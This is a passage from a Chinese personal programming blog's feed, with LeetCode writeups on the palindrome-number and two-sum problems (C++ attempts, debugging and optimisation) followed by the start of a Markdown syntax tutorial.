class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( x &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">            <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                v.<span class="built_in">push_back</span>(x%<span class="number">10</span>);</span><br><span class="line">                x /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> len= v.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len/<span class="number">2</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = len<span class="number">-1</span>; j &gt; len/<span class="number">2</span>; j--)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(v[i] == v[j])</span><br><span class="line">                        num++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num == len/<span class="number">2</span>)</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再提交一次：</p><img src="/2022/04/08/leetcodeno9/002.png" class=""><p>额，这就很尴尬了，简单测试了一下，发现是我的思路出问题了，因为我拆成两份算的时候考虑的是这个数是奇数位数而不是偶数位数……<br>调整的时候注意到一个问题。。预期对半算，不如直接i和len算</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(v[i] == v[len-i])</span><br><span class="line">        num++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先测试一下。。发现还是有点问题，就是因为len是元素个数，但是实际上vector[]重载跟数组一下都是从0开始，这就导致len得先-1，放在循环里反而不合适了。所以对上面的len&#x3D;size的时候就-1，这代码就跟屎山一样现在堆积在一起。测了一下，0不起作用，其他都行了，因为我while的时候判断条件就是x&gt;0，所以就很扯淡。这里直接用elseif套过去先，看看能不能通过。合并之后的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( x &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>( x == <span class="number">0</span> )&#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">            <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                v.<span class="built_in">push_back</span>(x%<span class="number">10</span>);</span><br><span class="line">                x /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> len= v.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(v[i] == v[len-i])</span><br><span class="line">                    num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num == len)</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/04/08/leetcodeno9/003.png" class=""><blockquote><p>通过是通过了，但是这个时间和空间效率真的惨不忍睹，这大概就是陷进去了。不过在用while拆解x的时候突然想到一个点。在后面优化一下看看。</p></blockquote><hr><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>回望屎山，满目鄙夷之色。。。。hhh,真的是人太菜。</p><p>回归正题，在将x不断%10拆解的时候，我那会就在想，如果用一个变量&#x3D;<code>x%10+变量*10</code>，这样的话，例如x&#x3D;121的时候，我创建一个变量n；</p><blockquote><p>n &#x3D; 121%10 + n*10，此时n &#x3D; 1;<br>然后将x&#x2F;10，再重复上步骤,<br>n &#x3D; 12%10 + n*10; 这个时候n &#x3D; 12;<br>在x&#x2F;10重复,<br>n &#x3D; 1%10 + n*10; n &#x3D; 121;</p></blockquote><p>这样直接if(n &#x3D;&#x3D; x)好像就完事了。</p><p>0-9结果都一样，也不用再加什么elseif了。</p><p>浓缩后的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            n = x%<span class="number">10</span> + n*<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(x == n)</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后测试了一下。。发现好像就0是对的，又看了几遍看出了点门道。。我的x被我一直&#x2F;10，后面变成0了。。。。难怪<code>if(x == n)</code>怎么没变化。。，</p><p>找个变量先复制x的值就行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            n = x%<span class="number">10</span> + n*<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(y == n)</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>决定命运的时刻来了，提交看看：</p><img src="/2022/04/08/leetcodeno9/004.png" class=""><p>额，真是坎坷啊，它提示好像溢出了，也是哦，题目提示的范围是-2<sup>31</sup> &lt;&#x3D; x &lt;&#x3D; 2<sup>31</sup> - 1,<br>那也就是说要把n的类型改成long int应该就行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            n = x%<span class="number">10</span> + n*<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(y == n)</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最后执行效率：</p><img src="/2022/04/08/leetcodeno9/005.png" class=""><p>时间好像挺叼的了，空间拉不满应该是我用了long int的问题，不过最后还是取决与服务器之间的联系吧，多测一下好像最好的内存占用也是5.6mb，然后时间会从0ms-12ms浮动，不知道是不是网络波动的问题。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>不得不感慨。。有的时候屎山写着写着找到金子了好像。。</p><p>去看了看评论。第一条就是对题目的批评：</p><img src="/2022/04/08/leetcodeno9/006.png" class=""><p>也难怪。。毕竟这个回文数没想到会这么大。。利用*10往上推是会出现这样的问题。</p><p>然后就是感觉能稍微优化一下空间和省略一个if哎，评论里大多都是直接return n&#x3D;&#x3D;x这样，这样雀食省了我定义一个bool变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            n = x%<span class="number">10</span> + n*<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> y == n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>几轮刷新提交最好情况内存也就是5.6MB，好像没有太大区别，时间反而除了第一次的0ms，其他最好表现都是4ms了，不过问题不大。</p><p>同样的也看到了之前用string的，也就是我开头说的一个问题，int转换成string的函数是带来的新特性还是标准库函数，但是我个人还是不赞成去用这种方法。</p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode第一题</title>
      <link href="/2022/04/06/leetcodeno1/"/>
      <url>/2022/04/06/leetcodeno1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><img src="/2022/04/06/leetcodeno1/000.png" class=""><p>有人相爱，有人夜里开车看海，有人连leetcode第一题都做不出来。—— 摘自评论</p><span id="more"></span><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>没啥参考的，用到啥函数了就回头看看。毕竟记得不是很清楚。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><img src="/2022/04/06/leetcodeno1/001.png" class=""><p>从题目要求里看形式就像输入一个数组和一个目标数，求数组中哪两个成员能组合成这个目标数。</p><p>默认给的模板是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>估计是因为c++ 有stl思想，所以不用数组，而使用容器vector</p></blockquote><h2 id="初解"><a href="#初解" class="headerlink" title="初解"></a>初解</h2><p>暴力解法我们肯定想到的是两层for循环直接挨个if过来<br>实现：<br>时间复杂度按照这样说好像就是<code>T(n)=O(n^2)</code>;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;nums.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]==target)&#123;</span><br><span class="line">                    n.<span class="built_in">push_back</span>(i);</span><br><span class="line">                    n.<span class="built_in">push_back</span>(j);</span><br><span class="line">                    <span class="keyword">return</span> n; <span class="comment">//或者直接break结束循环，反正最后都要返回。</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>最初的时候想创建一个数组返回的，但是题目用的好像是vector，也就凑合用了，后面看了下评论，发现return居然能返回{}，这样的一组数据，就感觉很新奇也很离谱。。毕竟传统概念return都是返回一个变量或者值</p></blockquote><h3 id="的解释"><a href="#的解释" class="headerlink" title="{}的解释"></a>{}的解释</h3><p>后面多看了几个评论，发现类似传递的规则，应该是默认将{}转换成这个函数类型相符的了，比如java的可能是public int[] twoSum，那么return的是，默认就是return int[] {i,j}.</p><p>至于为什么这么说呢，因我自己试了一下：</p><img src="/2022/04/06/leetcodeno1/007.png" class=""><p>是可以通过测试，并且提交也是正确的，那么ok就不用管这么多了，<strong>虽然感觉在实际的面试中应该出的题目会和这个不太一样，如果有需要开辟就开辟下新的空间用吧。</strong></p><hr><h2 id="调试初解"><a href="#调试初解" class="headerlink" title="调试初解"></a>调试初解</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; nums.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>故此这里开始都使用{}的方法，这样雀食省了空间，但是还没搞懂为什么能这么用，看后续能不能看到</p></blockquote><p>运行代码的时候发现输出和预期结果不一样：</p><img src="/2022/04/06/leetcodeno1/002.png" class=""><p>看了一下发现j不应该也从0开始，浪费了，那么把j的初始化设置为1；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; nums.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再次执行测试：</p><img src="/2022/04/06/leetcodeno1/003.png" class=""><p>哎发现可以了，提交看看</p><p>哎然后，然后就报错了。。</p><img src="/2022/04/06/leetcodeno1/004.png" class=""><p>又看了一下题目:<strong>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</strong><br>原来是不允许重复啊。那么在if里面在判断一次i！&#x3D; j即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; nums.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target &amp;&amp; i != j)&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提交代码：<img src="/2022/04/06/leetcodeno1/005.png" class=""><br>ok通过了。。但是这个执行用时才击败了5.12%的用户也太搞了。。不得不感慨人和人之间的差距。</p><hr><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>又看了下我的代码，看看哪能优化一丢丢，想了想，在i和j那里可以做做手脚。<br>比如测试样例是nums&#x3D;[2,5,5,11],target&#x3D;10;<br>我i肯定是从0开始，但是j呢，从1开始是没啥问题，但是如果</p><ul><li>第一次i&#x3D;0，j就从1-end。</li><li>第二次i&#x3D;1，j还是从1-end。</li><li>第三次i&#x3D;2，j还是从1-end。</li></ul><p>这样以来就能简单的看出问题所在之处了。</p><p>所以我们的j应该是&#x3D;1+i，这样一来</p><ul><li>第一次i&#x3D;0，j&#x3D;1+0 —— end</li><li>第二次i&#x3D;1，j&#x3D;1+1 —— end</li><li>第三次i&#x3D;2，j&#x3D;1+2 —— end</li></ul><p>这样可以说大小省略掉一半的时间了。</p><p>简单修改一下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; nums.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target &amp;&amp; i != j)&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再次提交：<img src="/2022/04/06/leetcodeno1/006.png" class=""></p><p>果然时间效率优化了不少，内存依旧是在9.8和9.9徘徊是正常的。</p><hr><h2 id="在优化——load"><a href="#在优化——load" class="headerlink" title="在优化——load"></a>在优化——load</h2><p>目前好像还没想到小于O(n^2)的办法，等哪天想到了再来改一下，因为怎么样都是要都举一遍</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>leetcode的测试感觉。。还得顺带看看服务器心情哈哈哈</p><img src="/2022/04/06/leetcodeno1/008.png" class=""><p>一样的的代码，结果每次都不相同哈哈哈哈</p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown基本语法</title>
      <link href="/2022/03/27/Markdown/"/>
      <url>/2022/03/27/Markdown/</url>
      
        <content type="html"><![CDATA[<!--# markdown基本语法--><span id="more"></span><hr><h1 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h1><p>不知道是不是主题的问题，很多markdown能支持的在转换成html的时候全失效了。<br>所以以下的语法如果也在此主题无法使用，建议直接使用html的方法，虽然时间成本比较高。<br>但是目前确实没有很好的解决办法，本人对js和css忘得差不多了，所以没有能力完全审计源代码。</p><hr><h2 id="1-标题"><a href="#1-标题" class="headerlink" title="1.标题"></a>1.标题</h2><p>标题的等级由#构成，#号越多对应的标题大小越小，就是类似html语法的h1-h6</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一级标题</span></span><br><span class="line"><span class="comment">## 二级标题</span></span><br><span class="line"><span class="comment">### 三级标题</span></span><br><span class="line"><span class="comment">#### 四级标题</span></span><br><span class="line"><span class="comment">##### 五级标题</span></span><br><span class="line"><span class="comment">###### 六级标题</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>值得注意的是，#号后面建议跟个空格，某些平台可能不用</p></blockquote><p>效果如下<code>(主题可能重写过，所以效果可能与其他平台略有差异)</code>：</p><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><hr><h2 id="2-字体"><a href="#2-字体" class="headerlink" title="2.字体"></a>2.字体</h2><p>常用修饰方法就是，粗体和斜体，然后两者结合粗斜体<br>markdown中，<code>\-</code>和<code>\*</code>的用法差不多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*斜体文本*</span><br><span class="line">_斜体文本_</span><br><span class="line"></span><br><span class="line">**粗体文本**</span><br><span class="line">__粗体文本__</span><br><span class="line"></span><br><span class="line">***粗斜体文本***</span><br><span class="line">___粗斜体文本___</span><br></pre></td></tr></table></figure><p>效果如下：<br><em>斜体文本</em><br><em>斜体文本</em></p><p><strong>粗体文本</strong><br><strong>粗体文本</strong></p><p><em><strong>粗斜体文本</strong></em><br><em><strong>粗斜体文本</strong></em></p><p>有的时候有点抽风效果可以看图：</p><img src="/2022/03/27/Markdown/001.png" class=""><hr><h2 id="3-段落"><a 